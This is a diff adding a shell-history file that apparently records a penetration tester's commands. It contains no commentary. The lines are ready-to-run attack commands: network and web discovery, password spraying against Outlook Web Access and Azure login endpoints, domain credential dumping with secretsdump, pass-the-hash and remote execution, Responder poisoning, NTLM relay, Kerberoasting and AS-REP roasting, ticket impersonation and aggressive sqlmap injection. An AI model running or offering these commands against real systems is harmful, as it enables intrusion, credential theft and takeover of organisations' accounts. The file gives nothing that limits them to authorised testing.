@@ -1,0 +1,44 @@
+: 1670248302:0;nmap -p 21-23,25,53,88,111,137,139,445,80,443,3389,8443,8080 -Pn -n -sS -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA nmapdiscovery -vvv --open -iL targets.txt
+: 1670248303:0;nmap -p- -Pn -n -sS -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA nmapfull -vvv --open -iL targets-live.txt
+: 1670248304:0;feroxbuster --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0\" -k -T 3 --scan-limit 10 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --rate-limit 50 -x html,php -C 400,500,404 --proxy http://127.0.0.1 -u https://www.example.com
+: 1670248304:0;cat web-hosts.txt | feroxbuster --stdin --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0\" -k -T 3 --scan-limit 10 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --rate-limit 50 -x html,php -C 400,500,404 --proxy http://127.0.0.1
+: 1670248305:0;docker run -it --entrypoint=/bin/sh --name crackmapexec -v ~/.cme:/root/.cme Porchetta-Industries/crackmapexec
+: 1670248306:0;docker exec -it crackmapexec sh
+: 1670248306:0;docker run --net=host -v $(pwd):/opt/Pcredz -it pcredz
+: 1670248306:0;docker run --net=host -v -it CrackMapExec 
+: 1670248306:0;./gowitness file -f web-targets.txt
+: 1670248306:0;./gowitness server -D inscope.sqlite
+: 1670248306:0;python3 max.py get-info --users --enabled -p hunter2
+: 1670248306:0;python3 crackhound.py -f cracked.txt -plaintext -addpw -p hunter2
+: 1670248306:0;python3 max.py add-spns -b -p hunter2
+: 1670248306:0;amass enum -v --active --brute -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -d domain.com -o domain.com
+: 1670248306:0;cat amass_combined.txt | grep FQDN |awk {'print $1 $6'} | tee all-subs.txt
+: 1670248306:0;scopecheck -l all_subs.txt | grep '+' | cut -d' ' -f2 | sort -u | tee subs-inscope.txt
+: 1670248306:0;gobuster dir -t 10 -x html,php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://example.com
+: 1670248306:0;assetfinder -subs-only example.com | sort -u | af-subs.txt
+: 1670248306:0;assetfinder -subs-only example.com | httprobe -p http:8080 -p http:8000 -p https:8443 -p https:9443 -p http:8001 -p http:81 | sort -u | tee af-up-subs.txt
+: 1670248306:0;impacket-secretsdump zach.local/user:password@192.168.1.1 -just-dc-user da-account1 | tee -a secrets.txt| grep -E ":[a-f0-9]{32}:" | tee -a hashes.txt  
+: 1670248306:0;impacket-wmiexec zach.local/Administrator:password123@DC-IP
+: 1670248306:0;certsync -u user -p 'hunter2' -d zach.local -dc-ip 10.0.0.4 -ns 10.0.0.18
+: 1670248306:0;secretsdump.py -system SYSTEM -security SECURITY -ntds NTDS.DIT -outputfile outputfilename LOCAL
+: 1670248306:0;sqlmap --proxy="http://127.0.0.1:8080/"  --level 5 --risk 3 --batch --tamper=between -r sqli.txt
+: 1670248307:0;kr scan api.example.org -A=apiroutes-230328 --fail-status-codes 400,403,404 -x 15
+: 1670248307:0;kr wordlists lists
+: 1670248307:0;trevorspray -u email.lst -p Summer2023! --exit-on-success --delay 15
+: 1670248307:0;./Go365 -endpoint rst -ul email-list.txt -p "Fall2022!" -d zach.com -w 15
+: 1670248307:0;trevorspray --url https://mail.example.gov/owa/auth/logon.aspx --recon example.gov
+: 1670248307:0;trevorspray --url https://login.windows.net/abco123-sdflkjse-sae4tlj/oauth2/token -u emails.csv -p 'Fall2022!' -d 15 -j 2
+: 1670248307:0;proxychains python3 bloodhound.py -c All -u admin -p 'Password!' -ns 192.168.1.1 --dns-tcp -d zach.local -dc DC01.zach.local --dns-timeout 30
+: 1670248307:0;smbclient -L \\test.local -I 10.10.10.1 -N
+: 1670248307:0;smbclient -L \\test.local -I 10.10.10.1 -U zach hunter2
+: 1670248307:0;smbclient -L \\10.10.10.1 -U zach.local/zach --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 
+: 1670248307:0;responder -I eth0 -A 
+: 1670248307:0;ldapsearch -LLL -x -H ldap://zach.local -b'' -s base '(objectclass=\*)'
+: 1670248307:0;kerbrute userenum -d zach.local usernames.txt
+: 1670248307:0;python3 getTGT.py zach.local/zach -dc-ip 10.10.10.1 -hashes ':'
+: 1670248307:0;python3 getST.py -hashes ':' -spn www/server01.zach.local -dc-ip 10.10.10.1 -impersonate Administrator zach.local/zach 
+: 1670248307:0;python3 wmiexec.py zach.local/zach:hunter2@10.10.10.1
+: 1670248307:0;python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -socks
+: 1670248307:0;python3 GetUserSPNs.py zach.local/zach:hunter2 -dc-ip 10.10.10.1 -request -outputfile roastme.txt
+: 1670248307:0;python3 GetNPUsers.py zach.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile asreproastme.txt
+: 1670248307:0;python3 bloodhound.py -c All -u admin -p 'Password!' -ns 192.168.1.1 -d zach.local -dc DC01.zach.local
